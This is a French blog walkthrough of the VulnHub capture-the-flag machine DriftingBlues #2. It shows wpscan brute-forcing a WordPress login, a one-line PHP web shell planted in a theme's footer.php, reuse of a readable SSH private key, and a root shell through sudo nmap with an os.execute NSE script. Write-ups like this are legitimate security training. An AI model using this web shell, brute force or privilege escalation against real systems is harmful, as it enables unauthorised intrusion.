# Solution du CTF DriftingBlues #2 de VulnHub

Intro
-----

Après [le précédent opus](http://devloop.users.sourceforge.net/index.php?article249/solution-du-ctf-driftingblues-1-de-vulnhub) j'attaque donc ce second épisode des CTF DriftingBlues, toujours téléchargeable sur VulnHub  

```plain
PORT   STATE SERVICE VERSION 
21/tcp open  ftp     ProFTPD 
| ftp-anon: Anonymous FTP login allowed (FTP code 230) 
|_-rwxr-xr-x   1 ftp      ftp       1403770 Dec 17  2020 secret.jpg 
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 
| ssh-hostkey:  
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA) 
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA) 
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519) 
80/tcp open  http    Apache httpd 2.4.38 ((Debian)) 
|_http-title: Site doesn't have a title (text/html). 
|_http-server-header: Apache/2.4.38 (Debian)
```

Il y a un serveur FTP qui autorise les connexions anonymes comme nous le montre Nmap. Toutefois avec Filezilla on voit qu'on ne peut pas remonter dans l'arborescence. On a donc que ce fichier *secret.jpg* que l'on peut récupérer.  

Il s'agit d'une photo d'un guitariste et un coup d'éditeur hexa ou la récupération des métadonnées EXIF avec le premier logiciel de traitement photo trouvé ne sortent rien d'intéressant.  

Une recherche d'image inversée nous apprend que le guitariste est *Otis Rush*. Potentiellement un indice.  

Utiliser les outils de stéganographie est souvent une plaie. Le code est ancien et ne compile pas forcément sur des machines récentes. J'ai trouvé [une image Docker](https://hub.docker.com/r/dominicbreuker/stego-toolkit)
 qui contient les binaires utiles, c'est l'occasion d'essayer :  

```plain
$ docker run -it --rm -v $(pwd):/data dominicbreuker/stego-toolkit /bin/bash
root@eb06c29f1622:/data# stegdetect secret.jpg  
secret.jpg : negative
```

Oups... Les autres outils présents n'ont pas été plus utiles. Passons à autre chose.  

La force
--------

Via énumération sur le serveur web on trouve très vite un Wordpress à l'adresse */blog*. Les posts présents ont tous été créés par un utilisateur baptisé *albert*.  

Vu que j'avais du temps AFK j'ai lancé wpscan pour bruteforcer le compte avec la wordlist rockyou :  

```plain
$ docker run -v /tools/wordlists/:/data -it --rm wpscanteam/wpscan --url http://192.168.56.7/blog/ -U albert -P /data/rockyou.txt
--- snip ---
[!] Valid Combinations Found: 
 | Username: albert, Password: scotland1
```

Je suppose qu'il y avait un indice avec le guitariste mais même en regardant sa page wikipedia pas de rapport à L'Ecosse, peut être qu'un des posts en faisait mention :-/   

Quoiqu'il en soit une fois connecté sur l'interface admin du Wordpress on va dans *Appeareance* puis *Theme Editor* pour éditer l'un des fichiers PHP du thème courant (*footer.php* pour moi) :  

```php
<?php if (isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>
```

Comme ça je peux passer des commandes sur le Wordpress et obtient l'output en bas de page.  

Mercury
-------

Un des premiers réflexes est de regarder le fichier */etc/passwd* qui nous renseigne sur les utilisateurs présents :  

```plain
freddie:x:1000:1000:freddie,,,:/home/freddie:/bin/bash
```

Cet utilisateur dispose du flag *user.txt* qui ne nous est pas lisible. En revanche sa clé privée SSH l'est !  

```plain
www-data@driftingblues:/var/www/html/blog$ ssh -i /home/freddie/.ssh/id_rsa freddie@127.0.0.1 
Could not create directory '/var/www/.ssh'. 
load pubkey "/home/freddie/.ssh/id_rsa": Permission denied 
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established. 
ECDSA key fingerprint is SHA256:/+Mlgo9EqzVybvI0rol0jnjKctAvhqRyag+YeY+IMrs. 
Are you sure you want to continue connecting (yes/no)? yes 
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts). 
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 

The programs included with the Debian GNU/Linux system are free software; 
the exact distribution terms for each program are described in the 
individual files in /usr/share/doc/*/copyright. 

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent 
permitted by applicable law. 
freddie@driftingblues:~$ cat user.txt  
flag 1/2 
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄ 
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄ 
░░░░█░░░░░░░░░░░░░░░░░░░░░░█ 
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█ 
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█ 
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█ 
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█ 
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█ 
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█ 
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█ 
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█ 
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█ 
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█ 
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█ 
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█ 
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀ 
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄ 
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█ 
░░█░░▌░█░░█░░█░░░█░░█░░█ 
░░█░░▀▀░░██░░█░░░█░░█░░█ 
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█ 
```

GTFO
----

```plain
freddie@driftingblues:~$ sudo -l 
Matching Defaults entries for freddie on driftingblues: 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin 

User freddie may run the following commands on driftingblues: 
    (root) NOPASSWD: /usr/bin/nmap
```

*Freddie* peut utiliser Nmap en tant que root sans donner de mot de passe. Pratique mais faillible [d'après GTFObins](https://gtfobins.github.io/gtfobins/nmap/) :  

```plain
freddie@driftingblues:~$ echo 'os.execute("/bin/sh")' > command.py
freddie@driftingblues:~$ sudo /usr/bin/nmap --script=command.py 
Starting Nmap 7.70 ( https://nmap.org ) at 2022-01-19 13:30 CST 
NSE: Warning: Loading 'command.py' -- the recommended file extension is '.nse'. 
# uid=0(root) gid=0(root) groups=0(root) 
# # root.txt 
# flag 2/2 
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄ 
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄ 
░░░░█░░░░░░░░░░░░░░░░░░░░░░█ 
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█ 
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█ 
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█ 
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█ 
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█ 
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█ 
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█ 
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█ 
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█ 
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█ 
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█ 
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█ 
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀ 
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄ 
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█ 
░░█░░▌░█░░█░░█░░░█░░█░░█ 
░░█░░▀▀░░██░░█░░░█░░█░░█ 
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█ 

congratulations!
```

Cette exploitation cache l'input d'où l'absence des commandes dans l'affichage précédent.  


*Published January 19 2022 at 21:01*